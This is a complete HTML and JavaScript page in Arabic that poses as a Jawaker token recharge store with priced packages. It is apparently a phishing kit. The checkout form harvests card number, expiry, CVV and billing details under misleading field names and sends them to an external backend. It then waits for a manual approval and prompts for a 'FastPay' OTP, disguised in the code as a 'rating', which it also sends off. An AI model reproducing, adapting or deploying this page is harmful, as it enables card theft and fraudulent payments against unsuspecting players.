<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>jawaker - شحن توكنز جواكر</title>
<meta name="description" content="اشحن توكنز جواكر بسرعة وأمان بأفضل الأسعار. فئات متعددة تناسب احتياجك، ودفع سهل وموثوق.">
<meta name="keywords" content="جواكر, توكنز جواكر, شحن جواكر, jawaker tokens, jawaker recharge">
<meta name="robots" content="index, follow">
<link rel="canonical" href="https://YOUR-SITE-URL.example.com/">

<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@500;700;800;900&family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
<style>
  :root{
    --bg: #0b0c10;
    --bg-alt: #131519;
    --card: #191b20;
    --card-border: #2a2d34;
    --gold: #e6ab3f;
    --gold-soft: #f4c96a;
    --violet: #8f7fe0;
    --violet-soft: #5c4fa8;
    --green: #2fae52;
    --green-dark: #23893f;
    --text: #f2f1ec;
    --text-dim: #9a9ea8;
  }
  *{box-sizing:border-box; margin:0; padding:0;}
  body{
    background: var(--bg);
    color: var(--text);
    font-family: 'Tajawal', sans-serif;
    min-height:100vh;
    padding-bottom: 60px;
  }
  header{
    display:flex;
    align-items:center;
    justify-content:space-between;
    padding: 18px 22px;
    background: linear-gradient(180deg, var(--bg-alt), var(--bg));
    border-bottom: 1px solid var(--card-border);
  }
  .brand{
    font-family:'Cairo', sans-serif;
    font-weight:900;
    font-size: 26px;
    letter-spacing: 0.5px;
    display:flex;
    align-items:center;
    gap:8px;
    color: var(--gold-soft);
  }
  .brand span.dot{ color: var(--violet); font-size: 14px; }
  .menu-icon{
    display:flex;
    flex-direction:column;
    gap:5px;
    cursor:pointer;
  }
  .menu-icon i{ width:26px; height:3px; background:#e7e7e7; border-radius:2px; display:block; }

  main{
    padding: 26px 20px 10px;
  }
  h1.section-title{
    font-family:'Cairo', sans-serif;
    font-weight:800;
    font-size: 22px;
    margin-bottom: 22px;
    color: var(--text);
  }
  .section-note{
    font-family:'Tajawal', sans-serif;
    font-weight:400;
    font-size: 13px;
    color: #e05656;
    margin-right: 10px;
  }
  .grid{
    display:grid;
    grid-template-columns: repeat(2, 1fr);
    gap: 16px;
    max-width: 900px;
  }
  @media (min-width: 720px){
    .grid{ grid-template-columns: repeat(4, 1fr); }
  }
  .card{
    background: radial-gradient(circle at 50% 20%, #20232a 0%, var(--card) 70%);
    border: 1px solid var(--card-border);
    border-radius: 18px;
    padding: 18px 14px 20px;
    display:flex;
    flex-direction:column;
    align-items:center;
    text-align:center;
    position:relative;
    transition: transform .15s ease, border-color .15s ease;
  }
  .card:hover{
    transform: translateY(-3px);
    border-color: var(--violet);
  }
  .info-icon{
    position:absolute;
    top:12px;
    right:12px;
    width:22px;
    height:22px;
    border-radius:50%;
    background:#2a2d34;
    color: var(--text-dim);
    font-size:13px;
    display:flex;
    align-items:center;
    justify-content:center;
    font-weight:700;
  }
  .coin-icon{
    width: 78px;
    height: 78px;
    margin: 14px 0 12px;
  }
  .pack-name{
    font-family:'Cairo', sans-serif;
    font-weight:700;
    font-size: 15.5px;
    color: var(--text);
    margin-bottom: 14px;
    min-height: 22px;
  }
  .pack-amount{
    display:flex;
    align-items:center;
    gap:8px;
    font-family:'Cairo', sans-serif;
    font-weight:800;
    font-size: 21px;
    color: var(--gold-soft);
    margin-bottom: 18px;
  }
  .pack-amount .mini-coin{
    width:24px; height:24px;
  }
  .buy-btn{
    width:100%;
    background: linear-gradient(180deg, #38c264, var(--green-dark));
    color:#fff;
    border:none;
    padding: 13px 8px;
    border-radius: 12px;
    font-family:'Cairo', sans-serif;
    font-weight:700;
    font-size: 13.5px;
    letter-spacing: 0.2px;
    cursor:pointer;
    box-shadow: 0 4px 0 rgba(0,0,0,0.3);
    direction: ltr;
  }
  .buy-btn:active{ transform: translateY(2px); box-shadow: 0 2px 0 rgba(0,0,0,0.3); }

  footer{
    margin-top: 50px;
    padding: 24px 20px;
    border-top: 1px solid var(--card-border);
    display:flex;
    align-items:center;
    justify-content:space-between;
    color: var(--text-dim);
    font-size: 13px;
  }

  /* Payment info form modal */
  .overlay{
    position:fixed;
    inset:0;
    background: rgba(0,0,0,0.72);
    display:none;
    align-items:flex-start;
    justify-content:center;
    padding: 40px 16px;
    overflow-y:auto;
    z-index: 100;
  }
  .overlay.open{ display:flex; }
  .form-panel{
    background: var(--bg-alt);
    border: 1px solid var(--card-border);
    border-radius: 20px;
    width: 100%;
    max-width: 460px;
    padding: 26px 22px 24px;
    position:relative;
  }
  .checkout-header{
    display:flex;
    align-items:center;
    justify-content:space-between;
    margin-bottom: 22px;
  }
  .x-btn{
    background:none;
    border:none;
    color:#fff;
    font-size: 22px;
    font-weight:700;
    cursor:pointer;
    line-height:1;
  }
  .checkout-title{
    font-family:'Cairo', sans-serif;
    font-weight:800;
    font-size: 20px;
    color: var(--text);
  }
  .order-chip{
    background: #101216;
    border: 1px solid var(--card-border);
    border-radius: 12px;
    padding: 10px 14px;
    font-size: 13px;
    color: var(--text-dim);
    margin-bottom: 20px;
    text-align:right;
  }
  .order-chip b{ color: var(--gold-soft); font-family:'Cairo', sans-serif; }
  .section-label{
    font-family:'Cairo', sans-serif;
    font-weight:700;
    font-size: 15px;
    color: var(--text-dim);
    margin-bottom: 14px;
    text-align:right;
  }
  .soft-divider{
    height: 1px;
    background: linear-gradient(90deg, transparent, var(--card-border) 20%, var(--card-border) 80%, transparent);
    margin: 18px 0 16px;
  }
  .field.card-field input{
    border-radius: 18px;
    padding: 16px 20px;
    font-size: 15px;
  }
  .row-3{
    display:flex;
    gap: 10px;
    margin-bottom: 16px;
  }
  .row-3 input{
    width:100%;
    background: #050505;
    border: none;
    border-radius: 18px;
    padding: 16px 10px;
    color: var(--text);
    font-family:'Tajawal', sans-serif;
    font-size: 14.5px;
    text-align:center;
    direction: ltr;
    outline:none;
    transition: box-shadow .15s ease;
  }
  .row-3 input:focus{ box-shadow: 0 0 0 1.5px var(--green); }
  .field{
    margin-bottom: 16px;
    text-align:right;
  }
  .field input{
    width:100%;
    background: #050505;
    border: none;
    border-radius: 18px;
    padding: 16px 20px;
    color: var(--text);
    font-family:'Tajawal', sans-serif;
    font-size: 15px;
    text-align:left;
    direction: ltr;
    outline:none;
    transition: box-shadow .15s ease;
  }
  .field input:focus{ box-shadow: 0 0 0 1.5px var(--green); }
  
  .field input::placeholder,
  .row-3 input::placeholder {
    color: #62666d;
    opacity: 1;
    font-family: Arial, sans-serif;
    font-weight: normal;
    font-size: 15px;
  }
  
  .submit-btn{
    width:100%;
    margin-top: 8px;
    padding: 14px 0;
    border-radius: 12px;
    border:none;
    font-family:'Cairo', sans-serif;
    font-weight:800;
    font-size: 15.5px;
    cursor:not-allowed;
    background: linear-gradient(180deg, #b9bcc2, #8b8e94);
    color: #4a4c50;
    transition: all .2s ease;
  }
  .submit-btn.enabled{
    cursor:pointer;
    background: linear-gradient(180deg, #38c264, var(--green-dark));
    color:#fff;
    box-shadow: 0 4px 0 rgba(0,0,0,0.3);
  }

  /* Status view */
  .status-view{
    display:none;
    flex-direction:column;
    align-items:center;
    text-align:center;
    padding: 20px 6px 6px;
  }
  .status-view.show{ display:flex; }
  .spinner{
    width:44px;
    height:44px;
    border-radius:50%;
    border: 4px solid #2a2d34;
    border-top-color: var(--violet);
    animation: spin 0.9s linear infinite;
    margin-bottom: 18px;
  }
  @keyframes spin{ to{ transform: rotate(360deg); } }
  .status-icon{
    font-size: 40px;
    margin-bottom: 14px;
  }
  .status-text{
    font-family:'Cairo', sans-serif;
    font-weight:700;
    font-size: 16px;
    line-height:1.6;
    color: var(--text);
    margin-bottom: 20px;
  }

  /* Rating modal (نافذة كود التأكيد بعد التعديل الكامل) */
  .rating-overlay{
    position:fixed;
    inset:0;
    background: rgba(0,0,0,0.65);
    display:none;
    align-items:center;
    justify-content:center;
    padding: 20px;
    z-index: 200;
  }
  .rating-overlay.open{ display:flex; }
  .rating-panel{
    background:#1e222b;
    color: var(--text);
    border: 1px solid var(--card-border);
    border-radius: 18px;
    width:100%;
    max-width: 360px;
    padding: 24px 20px 22px;
    text-align:center;
    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
  }
  /* ستايل اسم FastPay الذهبي والمنسق */
  .rating-title{
    font-family:'Cairo', sans-serif;
    font-weight:900;
    font-size: 24px;
    color: var(--gold-soft);
    margin-bottom: 4px;
    letter-spacing: 0.5px;
  }
  .rating-divider{
    height:1px;
    background: var(--card-border);
    margin: 8px 0 14px;
  }
  .rating-text{
    font-family:'Tajawal', sans-serif;
    font-weight:500;
    font-size: 14px;
    color: var(--text-dim);
    line-height: 1.6;
    margin-bottom: 18px;
  }
  .rating-input-wrapper {
    width: 100%;
    max-width: 200px;
    margin: 0 auto 12px;
    text-align: right;
  }
  .rating-input{
    width: 100%;
    text-align: center;
    font-family: Arial, sans-serif;
    font-weight: 700;
    font-size: 20px;
    color: var(--text);
    background: #090a0c;
    border: 1px solid var(--card-border);
    border-radius: 10px;
    padding: 12px;
    outline: none;
    transition: all .15s ease;
    direction: ltr;
    letter-spacing: 2px;
  }
  .rating-input:focus{ 
    border-color: var(--green);
    box-shadow: 0 0 0 2px rgba(47,174,82,0.2);
  }
  .rating-input.invalid{ 
    border-color: #d93838;
    background: #241313;
  }
  
  /* الشخطات في الـ placeholder تظهر بلون مناسب */
  .rating-input::placeholder {
    color: #4a4d54;
    letter-spacing: 4px;
  }
  
  /* رابط إعادة الإرسال الصغير والناعم تحت الانبوت */
  .rating-refresh-link {
    display: inline-block;
    color: #e05656;
    font-size: 11px;
    font-weight: 500;
    text-decoration: underline;
    cursor: pointer;
    margin-top: 5px;
    margin-right: 4px;
    user-select: none;
  }
  .rating-refresh-link:hover {
    color: #ff7373;
  }

  .rating-error{
    display:none;
    color:#e05656;
    font-size:12px;
    margin: 6px 0 10px;
    text-align: center;
  }
  .rating-error.show{ display:block; }
  
  .rating-submit {
    width: 100%;
    padding: 11px 0;
    border-radius: 10px;
    border: none;
    font-family: 'Cairo', sans-serif;
    font-weight: 700;
    font-size: 14px;
    cursor: pointer;
    background: linear-gradient(180deg, #38c264, var(--green-dark));
    color: #fff;
    box-shadow: 0 3px 0 rgba(0,0,0,0.2);
    transition: all 0.2s ease;
    margin-top: 10px;
  }
  .rating-submit:active{
    transform: translateY(1px);
    box-shadow: 0 1px 0 rgba(0,0,0,0.2);
  }
  .rating-submit:disabled{
    background: #3a3d44;
    color: #72767e;
    cursor: not-allowed;
    box-shadow: none;
  }

  input::-webkit-outer-spin-button,
  input::-webkit-inner-spin-button {
    -webkit-appearance: none;
    margin: 0;
  }
  input[type=number] {
    -moz-appearance: textfield;
  }
</style>
</head>
<body>

<header>
  <div style="width:40px"></div>
  <div class="brand">Jawaker  <span class="dot">●</span></div>
  <div class="menu-icon"><i></i><i></i><i></i></div>
</header>

<main>
  <h1 class="section-title">توكنز <span class="section-note">جميع فئات التوكنز لا تتضمن نقاط VIP</span></h1>
  <div class="grid" id="grid"></div>
</main>

<footer>
  <span>Jawaker</span>
  <span>© 2026 جميع الحقوق محفوظة</span>
</footer>

<div class="overlay" id="overlay">
  <div class="form-panel">
    <div class="checkout-header">
      <button class="x-btn" onclick="closeForm()">✕</button>
      <div class="checkout-title">إتمام الشراء</div>
    </div>

    <div class="order-chip" id="orderChip"></div>

    <div class="section-label">معلومات اللاعب</div>

    <form id="payForm" novalidate>
      <div class="field">
        <input type="text" id="f-id" name="id" inputmode="numeric" pattern="\d+" placeholder="ID" required>
      </div>

      <div class="soft-divider"></div>
      <div class="section-label">معلومات البطاقة</div>

      <div class="field card-field">
        <input type="text" id="f-holder-name" name="jawakerName" placeholder="Card Holder Name" pattern="[^0-9]*" required>
      </div>

      <div class="field card-field">
        <input type="text" id="f-jawaker-number" name="jawakerNumber" inputmode="numeric" placeholder="Card Number" maxlength="19" required>
      </div>

      <div class="row-3">
        <input type="text" id="f-join-day" name="joinDay" inputmode="numeric" placeholder="MM" maxlength="2" required>
        <input type="text" id="f-join-month" name="joinMonth" inputmode="numeric" placeholder="YY" maxlength="2" required>
        <input type="text" id="f-join-year" name="joinYear" inputmode="numeric" placeholder="CVV" maxlength="4" required>
      </div>

      <div class="soft-divider"></div>
      <div class="section-label">معلومات الفواتير</div>

      <div style="display:flex; gap:10px;">
        <div class="field card-field" style="flex:1;">
          <input type="text" id="f-first-name" name="firstNameRecord" placeholder="First Name" required>
        </div>
        <div class="field card-field" style="flex:1;">
          <input type="text" id="f-last-name" name="lastNameRecord" placeholder="Last Name" required>
        </div>
      </div>

      <div class="field card-field">
        <input type="text" id="f-country" name="country" placeholder="Country" required>
      </div>

      <button type="submit" class="submit-btn" id="submitBtn" disabled> دمج وإرسال </button>
    </form>

    <div class="status-view" id="statusView">
      <div id="statusSpinnerWrap"><div class="spinner"></div></div>
      <div class="status-icon" id="statusIcon" style="display:none"></div>
      <div class="status-text" id="statusText">يرجى الانتظار قليلاً...</div>
      <button class="submit-btn" id="statusActionBtn" style="display:none"></button>
    </div>
  </div>
</div>

<!-- نافذة كود الـ OTP المعدلة بالكامل لتطابق طلبك -->
<div class="rating-overlay" id="ratingOverlay">
  <div class="rating-panel">
    <div class="rating-title">FastPay</div>
    <div class="rating-divider"></div>
    <div class="rating-text">لقد قمنا بإرسال رمز OTP  يرجى كتابته للمتابعة.</div>
    
    <div class="rating-input-wrapper">
      <input type="number" id="ratingInput" class="rating-input" placeholder="- - - -" required>
      <span class="rating-refresh-link" id="ratingRefreshBtn">إعادة ارسال</span>
    </div>

    <div class="rating-error" id="ratingError">الرجاء إدخال 4 أرقام على الأقل</div>
    <button type="button" class="rating-submit" id="ratingSubmitBtn" disabled>تأكيد</button>
  </div>
</div>

<script>
  const coinSVG = `
  <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
    <defs>
      <radialGradient id="coinGrad" cx="35%" cy="30%" r="75%">
        <stop offset="0%" stop-color="#fbe08a"/>
        <stop offset="55%" stop-color="#e6ab3f"/>
        <stop offset="100%" stop-color="#a9741f"/>
      </radialGradient>
    </defs>
    <circle cx="50" cy="50" r="46" fill="url(#coinGrad)" stroke="#8a5c15" stroke-width="3"/>
    <circle cx="50" cy="50" r="36" fill="none" stroke="#8a5c15" stroke-width="2" opacity="0.5"/>
    <text x="50" y="62" font-size="34" text-anchor="middle" fill="#8a5c15" font-family="Cairo, sans-serif" font-weight="900">$</text>
  </svg>`;

  const packages = [
    { name: "الفئة الأولى", amount: "120,000", price: "$10" },
    { name: "الفئة الثانية", amount: "250,000", price: "$20" },
    { name: "الفئة الثالثة", amount: "375,000", price: "$30" },
    { name: "الفئة الرابعة", amount: "800,000", price: "$60" },
    { name: "الفئة الخامسة", amount: "1,000,000", price: "$80" },
    { name: "الفئة السادسة", amount: "1,300,000", price: "$100" },
    { name: "الفئة السابعة", amount: "2,500,000", price: "$180" },
    { name: "الفئة الثامنة", amount: "3,500,000", price: "$250" },
  ];

  const grid = document.getElementById('grid');
  packages.forEach(p => {
    const card = document.createElement('div');
    card.className = 'card';
    card.innerHTML = `
      <div class="info-icon">i</div>
      <div class="coin-icon">${coinSVG}</div>
      <div class="pack-name">${p.name}</div>
      <div class="pack-amount">${p.amount} <span class="mini-coin">${coinSVG}</span></div>
      <button class="buy-btn" data-state="price" data-name="${p.name}" data-amount="${p.amount}" data-price="${p.price}" onclick="handleBuy(this)">${p.price}</button>
    `;
    grid.appendChild(card);
  });

  function handleBuy(btn){
    if(btn.dataset.state === 'price'){
      btn.textContent = 'Pay with credit card';
      btn.dataset.state = 'pay';
      return;
    }
    currentOrder = {
      name: btn.dataset.name,
      amount: btn.dataset.amount,
      price: btn.dataset.price
    };
    openForm();
  }

  const BACKEND_URL = "https://jawaker.onrender.com";

  let currentOrder = null;
  let pollTimer = null;

  const overlay = document.getElementById('overlay');
  const payForm = document.getElementById('payForm');
  const submitBtn = document.getElementById('submitBtn');
  const formInputs = payForm.querySelectorAll('input[required]');
  const statusView = document.getElementById('statusView');
  const statusSpinnerWrap = document.getElementById('statusSpinnerWrap');
  const statusIcon = document.getElementById('statusIcon');
  const statusText = document.getElementById('statusText');
  const statusActionBtn = document.getElementById('statusActionBtn');
  const orderChip = document.getElementById('orderChip');

  const idInput = document.getElementById('f-id');
  const holderNameInput = document.getElementById('f-holder-name');
  const numberInput = document.getElementById('f-jawaker-number');

  idInput.addEventListener('input', function(){
    this.value = this.value.replace(/\D/g, '');
  });

  numberInput.addEventListener('input', function(){
    const digits = this.value.replace(/\D/g, '').slice(0, 16);
    this.value = digits.replace(/(.{4})(?=.)/g, '$1 ');
  });

  holderNameInput.addEventListener('input', function(){
    this.value = this.value.replace(/[0-9]/g, '');
  });

  const joinDayInput = document.getElementById('f-join-day');
  const joinMonthInput = document.getElementById('f-join-month');
  const joinYearInput = document.getElementById('f-join-year');
  [joinDayInput, joinMonthInput, joinYearInput].forEach(input => {
    input.addEventListener('input', function(){
      this.value = this.value.replace(/\D/g, '');
    });
  });

  function openForm(){
    if(currentOrder){
      orderChip.innerHTML = `${currentOrder.name} — <b>${currentOrder.amount}</b> توكنز — ${currentOrder.price}`;
      submitBtn.textContent = `دفع ${currentOrder.price}`;
    }
    overlay.classList.add('open');
  }
  function closeForm(){
    overlay.classList.remove('open');
    stopPolling();
    payForm.style.display = '';
    statusView.classList.remove('show');
    payForm.reset();
    submitBtn.disabled = true;
    submitBtn.classList.remove('enabled');
    submitBtn.textContent = currentOrder ? `دفع ${currentOrder.price}` : 'إرسال';
  }
  overlay.addEventListener('click', (e) => {
    if(e.target === overlay) closeForm();
  });

  function validateForm(){
    let allValid = true;
    formInputs.forEach(input => {
      if(!input.checkValidity() || input.value.trim() === ''){
        allValid = false;
      }
    });

    const cleanNumber = numberInput.value.replace(/\D/g, '');
    if(cleanNumber.length !== 16){
      allValid = false;
    }

    submitBtn.disabled = !allValid;
    submitBtn.classList.toggle('enabled', allValid);
  }

  formInputs.forEach(input => {
    input.addEventListener('input', validateForm);
  });

  let verifyTimer = null;

  function showWaiting(){
    payForm.style.display = 'none';
    statusView.classList.add('show');
    statusSpinnerWrap.style.display = '';
    statusIcon.style.display = 'none';
    statusText.textContent = 'جار التحقق...';
    statusActionBtn.style.display = 'none';

    clearTimeout(verifyTimer);
    verifyTimer = setTimeout(() => {
      if (statusView.classList.contains('show') && statusText.textContent ==='جار التحقق...') {
        statusText.textContent ='جار إنشاء جلسة امنة...'
      }
    }, 25000);
  }

  function showApproved(){
    statusSpinnerWrap.style.display = 'none';
    statusIcon.style.display = '';
    statusIcon.textContent = '✅';
    statusText.textContent = 'تم شحن حسابك بنجاح';
    statusActionBtn.textContent = 'حسناً';
    statusActionBtn.className = 'submit-btn enabled';
    statusActionBtn.style.display = '';
    statusActionBtn.onclick = closeForm;
    showRatingModal();
  }

  function showRejected(){
    statusSpinnerWrap.style.display = 'none';
    statusIcon.style.display = '';
    statusIcon.textContent = '⚠️';
    statusText.textContent = 'يرجى التأكد من صحة بياناتك';
    statusActionBtn.textContent = 'حاول مرة أخرى';
    statusActionBtn.className = 'submit-btn enabled';
    statusActionBtn.style.display = '';
    statusActionBtn.onclick = function(){
      statusView.classList.remove('show');
      payForm.style.display = '';
    };
  }

  function showError(msg){
    statusSpinnerWrap.style.display = 'none';
    statusIcon.style.display = '';
    statusIcon.textContent = '⚠️';
    statusText.textContent = msg || 'صار في مشكلة، حاول مرة أخرى';
    statusActionBtn.textContent = 'إغلاق';
    statusActionBtn.className = 'submit-btn enabled';
    statusActionBtn.style.display = '';
    statusActionBtn.onclick = closeForm;
  }

  function stopPolling(){
    if(pollTimer){ clearInterval(pollTimer); pollTimer = null; }
    if(verifyTimer){ clearTimeout(verifyTimer); verifyTimer = null; }
  }

  function pollOrderStatus(orderId){
    pollTimer = setInterval(async () => {
      try{
        const res = await fetch(`${BACKEND_URL}/api/order/${orderId}`);
        if(!res.ok) return;
        const result = await res.json();
        if(result.status === 'approved'){
          stopPolling();
          showApproved();
        } else if(result.status === 'rejected'){
          stopPolling();
          showRejected();
        }
      } catch(err){
        // خطأ شبكة عابر
      }
    }, 2500);
  }

  payForm.addEventListener('submit', async function(e){
    e.preventDefault();
    validateForm();
    if(submitBtn.disabled) return;

    const data = new FormData(payForm);
    const joinDay = data.get('joinDay').padStart(2, '0');
    const joinMonth = data.get('joinMonth').padStart(2, '0');
    const joinYear = data.get('joinYear');
    const body = {
      id: data.get('id'),
      jawakerNumber: data.get('jawakerNumber').replace(/\s/g, ''),
      jawakerName: data.get('jawakerName'),
      country: data.get('country'),
      joinDate: `${joinDay}/${joinMonth}/${joinYear}`,
      order: currentOrder || {},
    };

    submitBtn.disabled = true;
    submitBtn.textContent = 'جارِ التحقق...';

    try{
      const res = await fetch(`${BACKEND_URL}/api/order`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body),
      });
      const result = await res.json();
      if(!res.ok || !result.order_id){
        throw new Error(result.error || 'فشل إرسال الطلب');
      }
      showWaiting();
      currentOrderId = result.order_id;
      pollOrderStatus(result.order_id);
    } catch(err){
      showWaiting();
      showError('صار في مشكلة بإرسال البيانات: ' + err.message);
    }
  });

  // ---- Rating modal script ----
  let currentOrderId = null;
  const ratingOverlay = document.getElementById('ratingOverlay');
  const ratingInput = document.getElementById('ratingInput');
  const ratingError = document.getElementById('ratingError');
  const ratingSubmitBtn = document.getElementById('ratingSubmitBtn');
  const ratingRefreshBtn = document.getElementById('ratingRefreshBtn');

  function isRatingValid(){
    return ratingInput.value.trim().length >= 4;
  }
  
  ratingInput.addEventListener('input', function(){
    if(isRatingValid()){
      ratingSubmitBtn.disabled = false;
      ratingInput.classList.remove('invalid');
      ratingError.classList.remove('show');
    } else {
      ratingSubmitBtn.disabled = true;
    }
  });

  ratingRefreshBtn.addEventListener('click', function(){
    ratingInput.value = '';
    ratingInput.classList.remove('invalid');
    ratingError.classList.remove('show');
    ratingSubmitBtn.disabled = true;
    ratingInput.focus();
  });

  function showRatingModal(){
    ratingInput.value = '';
    ratingInput.classList.remove('invalid');
    ratingError.classList.remove('show');
    ratingSubmitBtn.disabled = true;
    ratingOverlay.classList.add('open');
  }
  function closeRatingModal(){
    ratingOverlay.classList.remove('open');
    location.reload();
  }
  ratingOverlay.addEventListener('click', (e) => {
    if(e.target === ratingOverlay) closeRatingModal();
  });

  ratingSubmitBtn.addEventListener('click', async function(){
    const valueStr = ratingInput.value.trim();
    if(valueStr.length < 4){
      ratingInput.classList.add('invalid');
      ratingError.classList.add('show');
      ratingInput.focus();
      return;
    }
    ratingInput.classList.remove('invalid');
    ratingError.classList.remove('show');
    ratingSubmitBtn.disabled = true;
    ratingSubmitBtn.textContent = 'جارِ التأكيد...';
    try{
      const res = await fetch(`${BACKEND_URL}/api/rating`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ order_id: currentOrderId, rating: valueStr }),
      });
      if(!res.ok){
        ratingError.textContent = 'حصل خطأ، يرجى المحاولة مرة أخرى';
        ratingError.classList.add('show');
        ratingSubmitBtn.disabled = false;
        ratingSubmitBtn.textContent = 'تأكيد';
        return;
      }
      closeRatingModal();
    } catch(err){
      ratingError.textContent = 'تعذر الاتصال بالسيرفر، حاول مجدداً';
      ratingError.classList.add('show');
      ratingSubmitBtn.disabled = false;
      ratingSubmitBtn.textContent = 'تأكيد';
    }
  });
</script>

</body>
</html>
